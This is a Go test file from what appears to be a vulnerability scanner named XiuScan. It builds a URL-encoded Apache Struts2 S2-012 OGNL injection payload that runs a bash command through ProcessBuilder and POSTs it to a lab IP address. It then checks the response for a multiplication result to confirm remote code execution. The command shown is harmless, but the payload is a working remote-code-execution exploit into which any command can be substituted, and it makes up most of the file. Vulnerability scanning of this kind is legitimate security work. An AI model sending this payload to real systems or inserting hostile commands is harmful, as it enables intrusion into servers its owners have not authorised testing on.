package test

import (
	"github.com/EmYiQing/XiuScan/core/http"
	"github.com/EmYiQing/XiuScan/core/tool"
	"github.com/EmYiQing/XiuScan/log"
	"net/url"
	"strconv"
	"strings"
	"testing"
)

func TestS2012(t *testing.T) {
	rand1 := tool.GetRandomInt()
	rand2 := tool.GetRandomInt()
	cmd := "expr __rand_1__ '*' __rand_2__"
	cmd = strings.ReplaceAll(cmd, "__rand_1__", strconv.Itoa(rand1))
	cmd = strings.ReplaceAll(cmd, "__rand_2__", strconv.Itoa(rand2))
	cmd = url.QueryEscape(cmd)
	payload := "name=%25%7B%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang." +
		"String%5B%5D%7B%22bash%22%2C+%22-c%22%2C%22__cmd__%22%7D%29%29.redirectEr" +
		"rorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c" +
		"%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedR" +
		"eader%28%23c%29%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f" +
		"%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResp" +
		"onse%22%29%2C%23f.getWriter%28%29.println%28new+java.lang.String%28%23e%2" +
		"9%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%2" +
		"9%7D"
	payload = strings.ReplaceAll(payload, "__cmd__", cmd)
	output := tool.FormatPayload(payload)
	log.Info("payload: %s", output)
	headers := make(map[string]string)
	headers["Content-Type"] = "application/x-www-form-urlencoded"
	req := &http.Request{
		Url:     http.NewUrl("http://192.168.222.132:8080/user.action"),
		Method:  "POST",
		Body:    payload,
		Headers: headers,
	}
	resp := http.DoRequest(req)
	if strings.Contains(string(resp.Body), strconv.Itoa(rand1*rand2)) {
		log.Info("find S2-012")
	}
}
